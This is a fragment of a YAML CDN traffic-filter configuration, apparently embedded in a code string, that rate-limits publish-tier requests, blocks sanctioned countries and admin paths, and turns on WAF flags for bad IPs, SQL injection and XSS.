      - name: rate-limit-edge-requests
        when:
          reqProperty: tier
          equals: "publish"
        rateLimit:
          limit: 500
          window: 10
          count: all
          penalty: 300
          groupBy:
            - reqProperty: clientIp
        action: log

      # Block requests from OFAC sanctioned countries
      - name: block-ofac-countries
        when:
          reqProperty: clientCountry
          in:
            - SY
            - BY
            - MM
            - KP
            - IR
            - CU
            - SD
        action: block

      # Block suspicious paths
      - name: block-admin-paths
        when:
          allOf:
            - { reqProperty: tier, equals: "publish" }
            - { reqProperty: path, like: "/admin/*" }
        action: block

      # ================================================
      # WAF TRAFFIC FILTER RULES
      # Requires Extended Security (WAF-DDoS) license
      # ================================================

      # Block attacks from known malicious IPs - SAFE to BLOCK immediately
      - name: block-attacks-from-bad-ips
        when:
          reqProperty: tier
          equals: "publish"
        action:
          type: block
          wafFlags:
            - ATTACK-FROM-BAD-IP

      # Log general attacks - Start with LOG, move to BLOCK after review
      - name: log-all-attacks
        when:
          reqProperty: tier
          equals: "publish"
        action:
          type: log
          wafFlags:
            - ATTACK

      # Block SQL injection attempts
      - name: block-sqli-attacks
        when:
          reqProperty: tier
          equals: "publish"
        action:
          type: block
          wafFlags:
            - SQLI

      # Block XSS attempts
      - name: block-xss-attacks
        when:
          reqProperty: tier
          equals: "publish"
        action:
          type: block
          wafFlags:
            - XSS
`;
